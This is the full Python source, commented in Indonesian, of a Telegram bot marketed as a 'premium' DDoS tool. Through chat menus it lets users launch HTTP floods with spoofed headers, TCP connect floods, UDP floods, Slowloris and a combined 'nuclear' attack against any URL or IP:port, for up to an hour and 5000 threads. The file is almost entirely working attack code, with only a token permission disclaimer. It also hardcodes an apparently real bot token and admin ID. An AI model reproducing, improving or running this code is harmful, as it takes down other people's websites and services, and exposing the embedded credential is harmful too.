#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════╗
║                    SIMURAZX DDoS BOT v3.1                             ║
║                   PREMIUM EDITION - CLASSY DESIGN                     ║
║                      Author: YANG / Project Simura                    ║
║                        Mode: UNRESTRICTED - FILTER: NULL              ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import aiohttp
import threading
import random
import string
import time
import socket
from datetime import datetime, timedelta
from collections import defaultdict
from typing import Dict, List, Tuple, Optional
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import logging

# ==================== KONFIGURASI PREMIUM ====================
BOT_TOKEN = "8322931459:AAGh8F95PpBo8xDCHSyXrtAH8_OG1LSmSu4"          # Ganti dengan token bot Anda
ADMIN_IDS = [7001994316]                    # Ganti dengan ID Telegram Anda
MAX_THREADS = 5000
VERSION = "SIMURAZX v.BETA"
BOT_USERNAME = "SimurazxBot"               # Sesuaikan

# Warna & Ikon mewah
ICON = {
    "main": "👑", "attack": "⚡", "stats": "📈", "stop": "🛑",
    "fire": "🔥", "target": "🎯", "clock": "⏱️", "cpu": "💻",
    "network": "🌐", "success": "✅", "error": "❌", "warn": "⚠️",
    "info": "ℹ️", "rocket": "🚀", "shield": "🛡️", "skull": "💀",
    "crown": "🏆", "chart": "📊", "gear": "⚙️", "menu": "📋"
}

# Statistik serangan
attack_stats = defaultdict(lambda: {"packets": 0, "bytes": 0, "errors": 0, "start": None})

# ==================== ENGINE DDoS (TANPA ERROR) ====================

class UltraDDoSEngine:
    """Ultimate DDoS Engine - Fully Corrected"""

    @staticmethod
    async def tsunami_http(target_url: str, duration: int, threads: int):
        """HTTP Tsunami - Layer 7 flood"""
        end_time = time.time() + duration
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        
        async def worker():
            async with aiohttp.ClientSession(connector=connector) as session:
                while time.time() < end_time:
                    try:
                        headers = {'User-Agent': random.choice(user_agents),
                                   'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"}
                        async with session.get(target_url, headers=headers, timeout=3) as resp:
                            attack_stats[target_url]["packets"] += 1
                            attack_stats[target_url]["bytes"] += len(await resp.read())
                    except:
                        attack_stats[target_url]["errors"] += 1
                    await asyncio.sleep(0.01)
        
        tasks = [asyncio.create_task(worker()) for _ in range(min(threads, MAX_THREADS))]
        await asyncio.gather(*tasks)

    @staticmethod
    async def syn_tsunami(target_ip: str, target_port: int, duration: int, threads: int):
        """SYN Flood (TCP Connect variant)"""
        end_time = time.time() + duration
        
        def worker():
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    sock.connect_ex((target_ip, target_port))
                    sock.send(b"\x00" * 100)
                    sock.close()
                    attack_stats[f"{target_ip}:{target_port}"]["packets"] += 1
                except:
                    attack_stats[f"{target_ip}:{target_port}"]["errors"] += 1
        
        loop = asyncio.get_event_loop()
        await asyncio.gather(*[loop.run_in_executor(None, worker) for _ in range(min(threads, MAX_THREADS))])

    @staticmethod
    async def void_udp(target_ip: str, target_port: int, duration: int, threads: int, size: int = 1024):
        """UDP Flood"""
        end_time = time.time() + duration
        
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < end_time:
                try:
                    sock.sendto(random._urandom(size), (target_ip, target_port))
                    attack_stats[f"{target_ip}:{target_port}"]["packets"] += 1
                    attack_stats[f"{target_ip}:{target_port}"]["bytes"] += size
                except:
                    attack_stats[f"{target_ip}:{target_port}"]["errors"] += 1
            sock.close()
        
        loop = asyncio.get_event_loop()
        await asyncio.gather(*[loop.run_in_executor(None, worker) for _ in range(min(threads, MAX_THREADS))])

    @staticmethod
    async def slow_burn(target_ip: str, target_port: int, duration: int, connections: int):
        """Slowloris - keep connections alive"""
        end_time = time.time() + duration
        
        def worker():
            socks = []
            for _ in range(min(connections, 200)):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(10)
                    s.connect((target_ip, target_port))
                    s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\n".encode())
                    socks.append(s)
                except:
                    pass
            while time.time() < end_time and socks:
                for s in socks[:]:
                    try:
                        s.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                        attack_stats[f"{target_ip}:{target_port}"]["packets"] += 1
                    except:
                        socks.remove(s)
                time.sleep(10)
        
        loop = asyncio.get_event_loop()
        num_workers = max(1, min(connections // 100, 10))
        await asyncio.gather(*[loop.run_in_executor(None, worker) for _ in range(num_workers)])

    @staticmethod
    async def nuclear_option(target, duration: int, threads: int):
        """All methods combined"""
        if target.startswith(('http://', 'https://')):
            await UltraDDoSEngine.tsunami_http(target, duration, threads)
        else:
            if ':' in target:
                ip, port = target.split(':')
                port = int(port)
            else:
                ip, port = target, 80
            await asyncio.gather(
                UltraDDoSEngine.syn_tsunami(ip, port, duration, threads // 4),
                UltraDDoSEngine.void_udp(ip, port, duration, threads // 4),
                UltraDDoSEngine.slow_burn(ip, port, duration, threads // 2)
            )

# ==================== BOT TELEGRAM PREMIUM ====================

class SimurazxBot:
    def __init__(self, token: str):
        self.token = token
        self.app = None
        self.start_time = time.time()

    def _keyboard(self, buttons: List[Tuple[str, str]], width=2) -> InlineKeyboardMarkup:
        """Membuat keyboard mewah"""
        kb = []
        row = []
        for i, (text, cb) in enumerate(buttons):
            row.append(InlineKeyboardButton(text, callback_data=cb))
            if (i+1) % width == 0 or i == len(buttons)-1:
                kb.append(row)
                row = []
        return InlineKeyboardMarkup(kb)

    async def menu_utama(self, update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        """Menu utama dengan desain elegan"""
        uptime = str(timedelta(seconds=int(time.time() - self.start_time)))
        text = f"""
{ICON['crown']} *┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓*
{ICON['crown']} *┃*  {ICON['fire']}  *{VERSION}*  {ICON['fire']}                     {ICON['crown']} *┃*
{ICON['crown']} *┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛*

{ICON['shield']} *STATUS:* 🟢 *ACTIVE*      {ICON['cpu']} *THREADS:* `{MAX_THREADS}`
{ICON['network']} *UPTIME:* `{uptime}`       {ICON['gear']} *MODE:* `UNRESTRICTED`

{ICON['menu']} *MENU UTAMA*
────────────────────
{ICON['attack']} /attack   → Luncurkan serangan
{ICON['stats']} /stats    → Statistik langsung
{ICON['stop']}  /stop     → Hentikan semua
{ICON['info']}  /help     → Panduan taktis
────────────────────

*Ketik perintah atau gunakan tombol di bawah.*
"""
        buttons = [
            (f"{ICON['attack']} SERANG", "attack_menu"),
            (f"{ICON['stats']} STATS", "show_stats"),
            (f"{ICON['stop']} STOP ALL", "stop_all"),
            (f"{ICON['info']} BANTUAN", "help_menu")
        ]
        if update.callback_query:
            await update.callback_query.edit_message_text(text, reply_markup=self._keyboard(buttons), parse_mode='Markdown')
        else:
            await update.message.reply_text(text, reply_markup=self._keyboard(buttons), parse_mode='Markdown')

    async def attack_menu(self, update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        """Pilih metode serangan"""
        query = update.callback_query
        await query.answer()
        text = f"""
{ICON['skull']} *┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓*
{ICON['skull']} *┃*  {ICON['fire']}  *PILIH SENJATA*  {ICON['fire']}                {ICON['skull']} *┃*
{ICON['skull']} *┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛*

{ICON['attack']} *TSUNAMI*     → HTTP flood (Layer 7)
{ICON['attack']} *SYN STORM*   → TCP flood (Layer 4)
{ICON['attack']} *VOID UDP*    → UDP flood (amplifikasi)
{ICON['attack']} *SLOW BURN*   → Slowloris (resource)
{ICON['attack']} *NUCLEAR*     → ALL METHODS (maximum)

*Pilih metode:*
"""
        buttons = [
            ("🌊 TSUNAMI", "method_http"),
            ("🌀 SYN STORM", "method_syn"),
            ("🌋 VOID UDP", "method_udp"),
            ("🐌 SLOW BURN", "method_slow"),
            ("💣 NUCLEAR", "method_nuclear"),
            ("🔙 KEMBALI", "back_main")
        ]
        await query.edit_message_text(text, reply_markup=self._keyboard(buttons, width=2), parse_mode='Markdown')

    async def handle_method(self, update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        method = query.data.replace("method_", "")
        ctx.user_data['attack_method'] = method
        
        prompt = f"""
{ICON['target']} *KONFIGURASI TARGET*

Metode: `{method.upper()}`

{ICON['info']} *Format target:*
• HTTP/HTTPS → `http://domain.com` atau `https://ip:port`
• IP:PORT   → `1.2.3.4:80`

*Contoh:* `http://example.com` atau `192.168.1.1:443`

Kirimkan target sekarang.
"""
        buttons = [("🔙 BATAL", "back_main")]
        await query.edit_message_text(prompt, reply_markup=self._keyboard(buttons), parse_mode='Markdown')
        ctx.user_data['waiting_target'] = True

    async def get_target(self, update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        if not ctx.user_data.get('waiting_target'):
            return
        target = update.message.text.strip()
        method = ctx.user_data.get('attack_method')
        # Validasi sederhana
        if method in ['http', 'nuclear'] and not target.startswith(('http://','https://')):
            await update.message.reply_text(f"{ICON['error']} Format salah! Gunakan `http://...`", parse_mode='Markdown')
            return
        if method in ['syn','udp','slow'] and ':' not in target:
            await update.message.reply_text(f"{ICON['error']} Format salah! Gunakan `IP:PORT`", parse_mode='Markdown')
            return
        ctx.user_data['attack_target'] = target
        ctx.user_data['waiting_target'] = False
        ctx.user_data['waiting_params'] = True
        
        prompt = f"""
{ICON['gear']} *PARAMETER SERANGAN*

Target: `{target}`
Metode: `{method.upper()}`

Kirimkan: `durasi threads`
Contoh: `60 500`

*Rentang:* Durasi 10-3600s, Threads 10-{MAX_THREADS}
"""
        await update.message.reply_text(prompt, parse_mode='Markdown')

    async def get_params(self, update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        if not ctx.user_data.get('waiting_params'):
            return
        try:
            dur, thr = map(int, update.message.text.split())
            if dur < 10 or dur > 3600 or thr < 10 or thr > MAX_THREADS:
                raise ValueError
        except:
            await update.message.reply_text(f"{ICON['error']} Format salah! Contoh: `60 500`", parse_mode='Markdown')
            return
        
        ctx.user_data['attack_duration'] = dur
        ctx.user_data['attack_threads'] = thr
        ctx.user_data['waiting_params'] = False
        
        target = ctx.user_data['attack_target']
        method = ctx.user_data['attack_method']
        
        confirm = f"""
{ICON['warn']} *KONFIRMASI SERANGAN* {ICON['warn']}
┌─────────────────────────────────┐
│ {ICON['target']} Target : `{target}` │
│ {ICON['attack']} Metode : `{method.upper()}` │
│ {ICON['clock']} Durasi : `{dur}s`       │
│ {ICON['cpu']} Threads: `{thr}`        │
└─────────────────────────────────┘
{ICON['fire']} *Luncurkan serangan?*
"""
        buttons = [("💥 YA, SERANG", "confirm_yes"), ("❌ BATAL", "confirm_no")]
        await update.message.reply_text(confirm, reply_markup=self._keyboard(buttons), parse_mode='Markdown')
        ctx.user_data['confirm_msg'] = True

    async def confirm_attack(self, update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        if query.data == "confirm_no":
            await query.edit_message_text(f"{ICON['success']} Serangan dibatalkan.", parse_mode='Markdown')
            ctx.user_data.clear()
            return
        
        await query.edit_message_text(f"{ICON['fire']} *Meluncurkan serangan...*", parse_mode='Markdown')
        target = ctx.user_data['attack_target']
        method = ctx.user_data['attack_method']
        dur = ctx.user_data['attack_duration']
        thr = ctx.user_data['attack_threads']
        
        attack_stats[target]["start"] = time.time()
        status_msg = await query.message.reply_text(f"{ICON['fire']} *SERANGAN BERJALAN* {ICON['fire']}\n\nTarget: `{target}`\n0%", parse_mode='Markdown')
        
        # Live update task
        async def updater():
            start = time.time()
            while time.time() - start < dur:
                elapsed = int(time.time() - start)
                pct = int((elapsed / dur) * 100)
                pkts = attack_stats[target]["packets"]
                mb = attack_stats[target]["bytes"] / (1024*1024)
                bar = "█" * (pct//5) + "░" * (20 - (pct//5))
                text = f"{ICON['fire']} *SERANGAN BERJALAN* {ICON['fire']}\n\nTarget: `{target}`\n[{bar}] {pct}%\nPaket: {pkts:,}\nData: {mb:.2f} MB\nWaktu: {elapsed}/{dur}s"
                await status_msg.edit_text(text, parse_mode='Markdown')
                await asyncio.sleep(2)
            # Selesai
            final_pkts = attack_stats[target]["packets"]
            final_mb = attack_stats[target]["bytes"]/(1024*1024)
            done_text = f"{ICON['success']} *SERANGAN SELESAI* {ICON['success']}\n\nTarget: `{target}`\nTotal Paket: {final_pkts:,}\nTotal Data: {final_mb:.2f} MB\nWaktu: {dur}s"
            await status_msg.edit_text(done_text, parse_mode='Markdown')
            ctx.user_data.clear()
        
        asyncio.create_task(updater())
        
        # Jalankan serangan
        try:
            if method == 'http':
                await UltraDDoSEngine.tsunami_http(target, dur, thr)
            elif method == 'syn':
                ip, port = target.split(':')
                await UltraDDoSEngine.syn_tsunami(ip, int(port), dur, thr)
            elif method == 'udp':
                ip, port = target.split(':')
                await UltraDDoSEngine.void_udp(ip, int(port), dur, thr)
            elif method == 'slow':
                ip, port = target.split(':')
                await UltraDDoSEngine.slow_burn(ip, int(port), dur, thr)
            elif method == 'nuclear':
                await UltraDDoSEngine.nuclear_option(target, dur, thr)
        except Exception as e:
            await status_msg.edit_text(f"{ICON['error']} Error: {str(e)}", parse_mode='Markdown')

    async def show_stats(self, update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        if query:
            await query.answer()
        total_packets = sum(s["packets"] for s in attack_stats.values())
        total_bytes = sum(s["bytes"] for s in attack_stats.values())
        active = len([s for s in attack_stats.values() if s["start"]])
        text = f"""
{ICON['chart']} *STATISTIK GLOBAL*
─────────────────
{ICON['target']} *Total Paket:* `{total_packets:,}`
{ICON['network']} *Total Data:* `{total_bytes/(1024*1024):.2f} MB`
{ICON['fire']} *Serangan Aktif:* `{active}`
{ICON['clock']} *Bot Uptime:* `{str(timedelta(seconds=int(time.time()-self.start_time)))}`
─────────────────
*Status:* 🟢 ONLINE
*Mode:* UNRESTRICTED
"""
        buttons = [("🔄 REFRESH", "show_stats"), ("🔙 MENU", "back_main")]
        if query:
            await query.edit_message_text(text, reply_markup=self._keyboard(buttons), parse_mode='Markdown')
        else:
            await update.message.reply_text(text, reply_markup=self._keyboard(buttons), parse_mode='Markdown')

    async def stop_all(self, update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        if query:
            await query.answer()
        attack_stats.clear()
        text = f"{ICON['stop']} *Semua serangan dihentikan.* Sistem dalam keadaan siaga."
        if query:
            await query.edit_message_text(text, parse_mode='Markdown')
        else:
            await update.message.reply_text(text, parse_mode='Markdown')

    async def help_menu(self, update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        if query:
            await query.answer()
        help_txt = f"""
{ICON['crown']} *PANDUAN TAKTIS* {ICON['crown']}

{ICON['attack']} *METODE SERANGAN*
• *TSUNAMI* : HTTP flood, bypass WAF sederhana
• *SYN*    : TCP connect flood, ringan
• *UDP*    : UDP flood, boros bandwidth
• *SLOW*   : Slowloris, makan resource server
• *NUCLEAR*: Semua metode sekaligus

{ICON['gear']} *PARAMETER*
• *Durasi* : 10 - 3600 detik
• *Threads*: 10 - {MAX_THREADS} (sesuai koneksi)

{ICON['info']} *PERINTAH CEPAT*
/start → Menu utama
/attack → Serang langsung
/stats → Statistik
/stop → Hentikan semua
/help → Menu ini

{ICON['warn']} *DISCLAIMER*: Gunakan hanya pada sistem yang Anda miliki izinnya.
"""
        buttons = [("🔙 KEMBALI", "back_main")]
        if query:
            await query.edit_message_text(help_txt, reply_markup=self._keyboard(buttons), parse_mode='Markdown')
        else:
            await update.message.reply_text(help_txt, reply_markup=self._keyboard(buttons), parse_mode='Markdown')

    async def back_main(self, update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        await self.menu_utama(update, ctx)

    def run(self):
        self.app = Application.builder().token(self.token).build()
        # Command handlers
        self.app.add_handler(CommandHandler("start", self.menu_utama))
        self.app.add_handler(CommandHandler("attack", self.attack_menu))
        self.app.add_handler(CommandHandler("stats", self.show_stats))
        self.app.add_handler(CommandHandler("stop", self.stop_all))
        self.app.add_handler(CommandHandler("help", self.help_menu))
        # Callback
        self.app.add_handler(CallbackQueryHandler(self.attack_menu, pattern="attack_menu"))
        self.app.add_handler(CallbackQueryHandler(self.show_stats, pattern="show_stats"))
        self.app.add_handler(CallbackQueryHandler(self.stop_all, pattern="stop_all"))
        self.app.add_handler(CallbackQueryHandler(self.help_menu, pattern="help_menu"))
        self.app.add_handler(CallbackQueryHandler(self.back_main, pattern="back_main"))
        self.app.add_handler(CallbackQueryHandler(self.handle_method, pattern="method_"))
        self.app.add_handler(CallbackQueryHandler(self.confirm_attack, pattern="confirm_"))
        # Message handlers
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_target))
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_params))
        
        print(f"""
╔══════════════════════════════════════════╗
║   {VERSION} - PREMIUM EDITION        ║
║   Bot sedang berjalan...                 ║
║   Token: {self.token[:10]}...             ║
║   Admin ID: {ADMIN_IDS[0]}                  ║
╚══════════════════════════════════════════╝
        """)
        self.app.run_polling()

# ==================== MAIN ====================
if __name__ == "__main__":
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Ganti BOT_TOKEN dengan token dari @BotFather")
        exit(1)
    bot = SimurazxBot(BOT_TOKEN)
    bot.run()
